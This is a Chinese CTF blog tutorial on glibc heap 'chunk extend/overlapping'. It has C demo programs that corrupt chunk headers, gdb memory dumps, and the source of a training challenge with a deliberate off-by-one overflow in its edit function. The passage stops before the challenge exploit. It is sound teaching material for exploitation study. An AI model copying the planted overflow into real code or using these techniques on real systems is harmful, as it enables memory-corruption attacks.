<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Chunk Extend/Overlapping | 堆拓展、重叠 | zhuyuan's Blog</title><meta name="author" content="主元"><meta name="copyright" content="主元"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Chunk Extend&#x2F;Overlapping | 堆拓展、重叠参考资料https:&#x2F;&#x2F;www.yuque.com&#x2F;cyberangel&#x2F;rg9gdm&#x2F;kgwh10 https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;108320408 https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43921239&#x2F;article&#x2F;detai">
<meta property="og:type" content="article">
<meta property="og:title" content="Chunk Extend&#x2F;Overlapping | 堆拓展、重叠">
<meta property="og:url" content="https://zhuyuan1213.github.io/2023/07/24/Chunk%20ExtendOverlapping%20%20%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0/index.html">
<meta property="og:site_name" content="zhuyuan&#39;s Blog">
<meta property="og:description" content="Chunk Extend&#x2F;Overlapping | 堆拓展、重叠参考资料https:&#x2F;&#x2F;www.yuque.com&#x2F;cyberangel&#x2F;rg9gdm&#x2F;kgwh10 https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;108320408 https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43921239&#x2F;article&#x2F;detai">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://w.wallhaven.cc/full/ex/wallhaven-exwgmr.png">
<meta property="article:published_time" content="2023-07-23T16:00:00.000Z">
<meta property="article:modified_time" content="2023-07-24T01:41:57.807Z">
<meta property="article:author" content="主元">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="study">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="heap">
<meta property="article:tag" content="Chunk Extend">
<meta property="article:tag" content="Overlapping">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://w.wallhaven.cc/full/ex/wallhaven-exwgmr.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://zhuyuan1213.github.io/2023/07/24/Chunk%20ExtendOverlapping%20%20%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Chunk Extend/Overlapping | 堆拓展、重叠',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-07-24 09:41:57'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://w.wallhaven.cc/full/ex/wallhaven-exwgmr.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">zhuyuan's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Chunk Extend/Overlapping | 堆拓展、重叠</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-24T01:41:57.807Z" title="更新于 2023-07-24 09:41:57">2023-07-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Chunk Extend/Overlapping | 堆拓展、重叠"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Chunk-Extend-x2F-Overlapping-堆拓展、重叠"><a href="#Chunk-Extend-x2F-Overlapping-堆拓展、重叠" class="headerlink" title="Chunk Extend&#x2F;Overlapping | 堆拓展、重叠"></a>Chunk Extend&#x2F;Overlapping | 堆拓展、重叠</h1><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><pre><code class="http">https://www.yuque.com/cyberangel/rg9gdm/kgwh10
https://blog.csdn.net/qq_41202237/article/details/108320408
https://blog.csdn.net/weixin_43921239/article/details/107841328
</code></pre>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>chunk extend技术能够产生的原因在于ptmalloc在对堆chunk进行操作时使用的各种宏。</p>
<p>在ptmalloc中，<strong>获取chunk块大小</strong>的操作如下</p>
<pre><code class="c">/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))

/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p) ((p)-&gt;mchunk_size)
</code></pre>
<p>一种是直接获取chunk的大小，不忽略掩码部分，另一种是忽略掩码部分。</p>
<p>在ptmalloc中，<strong>获取下一chunk块地址</strong>的操作如下</p>
<pre><code class="c">/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))
</code></pre>
<p>即使用当前块指针加上当前块的大小。</p>
<p>在ptmalloc中，<strong>获取前一个chunk信息</strong>的操作如下</p>
<pre><code class="c">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */
#define prev_size(p) ((p)-&gt;mchunk_prev_size)

/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */
#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))
</code></pre>
<p>即通过malloc_chunk-&gt;prev_size获取前一块大小，然后使用本chunk地址减去所得大小。</p>
<p>在ptmalloc，<strong>判断当前chunk是否是use状态</strong>的操作如下：</p>
<pre><code class="c">#define inuse(p)
    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)
</code></pre>
<p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p>
<h3 id="漏洞利用的必要条件"><a href="#漏洞利用的必要条件" class="headerlink" title="漏洞利用的必要条件"></a>漏洞利用的必要条件</h3><p>chunk extend是堆漏洞的一种常见利用手法，通过extend可以实现chunk overlapping（块重叠）的效果。这种利用方法需要以下的时机和条件：</p>
<ul>
<li>程序中存在基于堆的漏洞</li>
<li>漏洞可以控制chunk header中的数据</li>
</ul>
<h3 id="基本示例1：对inuse的fastbin进行extend"><a href="#基本示例1：对inuse的fastbin进行extend" class="headerlink" title="基本示例1：对inuse的fastbin进行extend"></a>基本示例1：对inuse的fastbin进行extend</h3><p>源码如下：</p>
<pre><code class="c">//gcc -g test1.c -o test
#include&lt;stdio.h&gt;
int main(void)
&#123;
    void *ptr,*ptr1;

    ptr=malloc(0x10);//分配第一个0x10的chunk
    malloc(0x10);//分配第二个0x10的chunk

    *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域

    free(ptr);
    ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容
    return 0;
&#125;
</code></pre>
<p>因为在编译阶段使用了“-g”参数，可以使用gdb在任意行下断点<code>b + 行号</code>。首先在第8行下断点，我们看一下完成两次堆分配之后在内存中的布局：</p>
<pre><code class="bash">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;=== top chunk
</code></pre>
<p>因为堆块的结构分为prev_size、size、块内容，拿上面这个64位程序举例：malloc(0x10)其中的0x10指得是内容部分申请0x10大小的空间，，prev_size和size部分各占8个字节，size记录的是整个堆块的大小，并且size的最后一位用来记录前一个块的状态，所以</p>
<pre><code>size = 0x8(prev_size) + 0x8(size) + 0x10(内容) + 0x1(标志位) = 0x21
</code></pre>
<p>可以看到第一个申请的0x10的chunk1在<strong>0x602000</strong>位置，size为0x21。第二个申请的0x10的chunk2在0x602020的位置，size为0x21。接下来我们在第9行下断点b 9执行***(long long *)((long long)hollk - 0x8) &#x3D; 0x41**，依然还是在这个位置看两个块有什么变化:</p>
<pre><code>0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== 篡改大小 &lt;=== chunk 1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021&lt;=== chunk 2
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;=== top chunk
</code></pre>
<p>***(long long *)((long long)hollk - 0x8) &#x3D; 0x41**，这段代码的意思是将，chunk1地址减0x8的位置修改成0x41，也就是说chunk1的size从0x21被修改成0x41。chunk1的空间变大了 ，但是chunk2就遭殃了，因为chunk1延展的空间正好是chunk2的空间，chunk2被chunk1包含占有了。接下来我们把断点下在第10行b 10：<br><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720153850237.png" alt="image-20230720153850237"></p>
<p>在执行完free(hollk)；这段代码之后chunk1被释放，可以看到chunk1和chunk2被合并成一个0x40的chunk放进fastbin中。最后我们重新申请一个大小为0x30的chunk时，fastbin中刚好有合适的大小块，这个时候chunk1与chunk2合并的chunk就会重新被启用，启用的同时原有chunk2中的内容也会连带着被启用，这个时候就可以直接通过这个新申请的块来对chunk2中的内容进行操作了</p>
<h3 id="基本示例-2：对-inuse-的-smallbin-进行-extend"><a href="#基本示例-2：对-inuse-的-smallbin-进行-extend" class="headerlink" title="基本示例 2：对 inuse 的 smallbin 进行 extend"></a>基本示例 2：对 inuse 的 smallbin 进行 extend</h3><pre><code class="c">#include&lt;stdio.h&gt;
int main()
&#123;
    void *ptr,*ptr1;

    ptr=malloc(0x80);//分配第一个 0x80 的chunk1
    malloc(0x10); //分配第二个 0x10 的chunk2
    malloc(0x10); //防止与top chunk合并的chunk3

    *(int *)((int)ptr-0x8)=0xb1;
    free(ptr);
    ptr1=malloc(0xa0);
&#125;
</code></pre>
<p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720154136515.png" alt="image-20230720154136515"></p>
<p>接下来我们在第10行下断点，执行<code>*(int *)((int)hollk-0x8) = 0xb1;</code>这段代码：</p>
<pre><code class="bash">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;===chunk1 篡改size域
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000021 &lt;=== 防止合并的chunk
0x6020c0:   0x0000000000000000  0x0000000000000000
0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk
</code></pre>
<p>和前面的例子一样，***(int *)((int)hollk-0x8) &#x3D; 0xb1**。这段代码也是将chunk1的size部分进行了更改，将原有的0x90扩展到了0xb0。这就导致了chunk2被chunk1所包含。接下来我们在第11行下断点释放chunk1：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720154259690.png" alt="image-20230720154259690"></p>
<pre><code class="bash">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;=== 被放入unsorted bin
0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000000  0x0000000000000021
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x00000000000000b0  0x0000000000000020 &lt;=== 注意此处标记为空
0x6020c0:   0x0000000000000000  0x0000000000000000
0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk
[+] unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)
</code></pre>
<p>这里解释一下为什么进的是unsortbin，有两种情况下进unsortbin：</p>
<ul>
<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中</li>
<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中</li>
</ul>
<p>那么这个例子就满足第二种情况，不属于fastbin中的空闲块，并且不和top chunk相邻。其实这个例子和第一个例子差不多，因为chunk1和chunk2合并之后的chunk的大小超过了fast bin的最大接收值，所以不进fast bin，并且chunk3的size标志位变成了0，证明前一个块chunk2是一个释放的状态。接下来的过程也是一样的，再次申请一个0xa0大小的chunk时，会从unsort bin中提取。连带着chunk2中的内容也会被提取出来，这样一来再次对chunk1进行操作，从而达到操作chunk2的目的</p>
<h3 id="基本示例-3：对-free-的-smallbin-进行-extend"><a href="#基本示例-3：对-free-的-smallbin-进行-extend" class="headerlink" title="基本示例 3：对 free 的 smallbin 进行 extend"></a>基本示例 3：对 free 的 smallbin 进行 extend</h3><pre><code class="c">#include&lt;stdio.h&gt;
int main()
&#123;
    void *ptr,*ptr1;

    ptr=malloc(0x80);//分配第一个0x80的chunk1
    malloc(0x10);//分配第二个0x10的chunk2

    free(ptr);//首先进行释放，使得chunk1进入unsorted bin

    *(int *)((int)ptr-0x8)=0xb1;
    ptr1=malloc(0xa0);
&#125;
</code></pre>
<p>第三个例子和前面两个有一些区别，前面两个都是先修改chunk1的size大小然后进行释放，但是这个例子是先进行释放，然后重新修改chunk1的size大小，依然还是一步一步来，首先在第8行下断点，使程序完成申请chunk的操作：</p>
<pre><code class="bash">0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== chunk 1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000020f51
</code></pre>
<p>接下来我们在第9行下断点，使程序完成对chunk1的释放：</p>
<pre><code class="bash">     unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)

0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== 进入unsorted bin
0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000090  0x0000000000000020 &lt;=== chunk 2
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;=== top chunk
</code></pre>
<p>释放之后的chunk1依然进入了unsort bin中。接下来 我们将断点下载第10行，需要注意的是此时更改size大小的操作是在free之后完成的：</p>
<pre><code class="c">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;=== size域被篡改
0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000090  0x0000000000000020
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000020f51
</code></pre>
<p>在修改完size之后重新申请0xa0的时候会从unsort bin中申请，这个时候大家需要总结一下，其实各个bin中存放的只有chunk的首地址，真正判断多大还得是去看这个chunk的size大小，所以再次申请的时候依然还可以对chunk2进行控制</p>
<h3 id="基本示例-4：通过-extend-后向-overlapping"><a href="#基本示例-4：通过-extend-后向-overlapping" class="headerlink" title="基本示例 4：通过 extend 后向 overlapping"></a>基本示例 4：通过 extend 后向 overlapping</h3><p>这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其它的一些利用。</p>
<pre><code class="c">//gcc -g test4.c  -o test4
#include&lt;stdio.h&gt;
int main()
&#123;
    void *hollk, *hollk1;
    hollk = malloc(0x10);//分配第1个 0x10 的chunk1
    malloc(0x10); //分配第2个 0x10 的chunk2
    malloc(0x10); //分配第3个 0x10 的chunk3
    malloc(0x10); //分配第4个 0x10 的chunk4    
    *(long *)((long)hollk - 0x8) = 0x61;
    free(hollk);
    hollk1 = malloc(0x50);
&#125;
</code></pre>
<p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p>
<h3 id="基本示例-5：通过-extend-前向-overlapping"><a href="#基本示例-5：通过-extend-前向-overlapping" class="headerlink" title="基本示例 5：通过 extend 前向 overlapping"></a>基本示例 5：通过 extend 前向 overlapping</h3><p>这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面的块</p>
<pre><code class="c">//gcc -g test5.c -o test
#include&lt;stdio.h&gt;
int main(void)
&#123;
    void *hollk1, *hollk2, *hollk3, *hollk4;
    hollk1 = malloc(128);//smallbin1
    hollk2 = malloc(0x10);//fastbin1
    hollk3 = malloc(0x10);//fastbin2
    hollk4 = malloc(128);//smallbin2
    malloc(0x10);//防止与top合并
    free(hollk1);
    *(int *)((long long)hollk4 - 0x8) = 0x90;//修改pre_inuse域
    *(int *)((long long)hollk4 - 0x10) = 0xd0;//修改pre_size域
    free(hollk4);//unlink进行前向extend
    malloc(0x150);//占位块
&#125;
</code></pre>
<p>先布置好 5 个堆块，然后释放 ptr1 进入到 unsortedbin 。修改 ptr4 的 prev_inuse 为 0 标记前一个堆块释放（空闲）；修改 ptr4 的 prev_size 为 ptr1+ptr2+ptr3 。释放 ptr4 会触发回收机制，也就是合并物理相邻的堆，用到的操作是 unlink ，就将 ptr1~4 当做一个堆块放入 unsortedbin。<br>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>题目链接</p>
<pre><code class="http">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13
</code></pre>
<h4 id="检查保护机制"><a href="#检查保护机制" class="headerlink" title="检查保护机制"></a>检查保护机制</h4><p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720162245306.png" alt="image-20230720162245306"></p>
<p>64位程序，开启了canary保护和NX保护，还有一点就是RELRO: Partial RELRO GOT表可以修改</p>
<h4 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h4><p>由于这道题给出了源码，所以分析时可以对照源码进行解读：</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void read_input(char *buf,size_t size)&#123;
    int ret ;
    ret = read(0,buf,size);
    if(ret &lt;=0)&#123;
        puts(&quot;Error&quot;);
        _exit(-1);
    &#125;	
&#125;

struct heap &#123;
    size_t size ;
    char *content ;
&#125;;

struct heap *heaparray[10];

void menu()&#123;
    puts(&quot;--------------------------------&quot;);
    puts(&quot;          Heap Creator          &quot;);
    puts(&quot;--------------------------------&quot;);
    puts(&quot; 1. Create a Heap               &quot;);
    puts(&quot; 2. Edit a Heap                 &quot;);
    puts(&quot; 3. Show a Heap                 &quot;);
    puts(&quot; 4. Delete a Heap               &quot;);
    puts(&quot; 5. Exit                        &quot;);
    puts(&quot;--------------------------------&quot;);
    printf(&quot;Your choice :&quot;);
&#125;

void create_heap()&#123;
    int i ;
    char buf[8];
    size_t size = 0;
    for(i = 0 ; i &lt; 10 ; i++)&#123;
        if(!heaparray[i])&#123;
            heaparray[i] = (struct heap *)malloc(sizeof(struct heap));
            if(!heaparray[i])&#123;
                puts(&quot;Allocate Error&quot;);
                exit(1);
            &#125;
            printf(&quot;Size of Heap : &quot;);
            read(0,buf,8);
            size = atoi(buf);
            heaparray[i]-&gt;content = (char *)malloc(size);
            if(!heaparray[i]-&gt;content)&#123;
                puts(&quot;Allocate Error&quot;);
                exit(2);
            &#125;
            heaparray[i]-&gt;size = size ;
            printf(&quot;Content of heap:&quot;);
            read_input(heaparray[i]-&gt;content,size);
            puts(&quot;SuccessFul&quot;);
            break ;
        &#125;
    &#125;
&#125;

void edit_heap()&#123;
    int idx ;
    char buf[4];
    printf(&quot;Index :&quot;);
    read(0,buf,4);
    idx = atoi(buf);
    if(idx &lt; 0 || idx &gt;= 10)&#123;
        puts(&quot;Out of bound!&quot;);
        _exit(0);
    &#125;
    if(heaparray[idx])&#123;
        printf(&quot;Content of heap : &quot;);
        read_input(heaparray[idx]-&gt;content,heaparray[idx]-&gt;size+1);
        puts(&quot;Done !&quot;);
    &#125;else&#123;
        puts(&quot;No such heap !&quot;);
    &#125;
&#125;

void show_heap()&#123;
    int idx ;
    char buf[4];
    printf(&quot;Index :&quot;);
    read(0,buf,4);
    idx = atoi(buf);
    if(idx &lt; 0 || idx &gt;= 10)&#123;
        puts(&quot;Out of bound!&quot;);
        _exit(0);
    &#125;
    if(heaparray[idx])&#123;
        printf(&quot;Size : %ld\nContent : %s\n&quot;,heaparray[idx]-&gt;size,heaparray[idx]-&gt;content);
        puts(&quot;Done !&quot;);
    &#125;else&#123;
        puts(&quot;No such heap !&quot;);
    &#125;

&#125;

void delete_heap()&#123;
    int idx ;
    char buf[4];
    printf(&quot;Index :&quot;);
    read(0,buf,4);
    idx = atoi(buf);
    if(idx &lt; 0 || idx &gt;= 10)&#123;
        puts(&quot;Out of bound!&quot;);
        _exit(0);
    &#125;
    if(heaparray[idx])&#123;
        free(heaparray[idx]-&gt;content);
        free(heaparray[idx]);
        heaparray[idx] = NULL ;
        puts(&quot;Done !&quot;);	
    &#125;else&#123;
        puts(&quot;No such heap !&quot;);
    &#125;

&#125;


int main()&#123;
    char buf[4];
    setvbuf(stdout,0,2,0);
    setvbuf(stdin,0,2,0);
    while(1)&#123;
        menu();
        read(0,buf,4);
        switch(atoi(buf))&#123;
            case 1 :
                create_heap();
                break ;
            case 2 :
                edit_heap();
                break ;
            case 3 :
                show_heap();
                break ;
            case 4 :
                delete_heap();
                break ;
            case 5 :
                exit(0);
                break ;
            default :
                puts(&quot;Invalid Choice&quot;);
                break;
        &#125;

    &#125;
    return 0 ;
&#125;
</code></pre>
<h4 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h4><p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720162734433.png" alt="image-20230720162734433"></p>
<h4 id="创建一个堆"><a href="#创建一个堆" class="headerlink" title="创建一个堆"></a>创建一个堆</h4><p>在程序中输入1以创建一个堆：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720162823355.png" alt="image-20230720162823355"></p>
<p>再创建一个堆：</p>
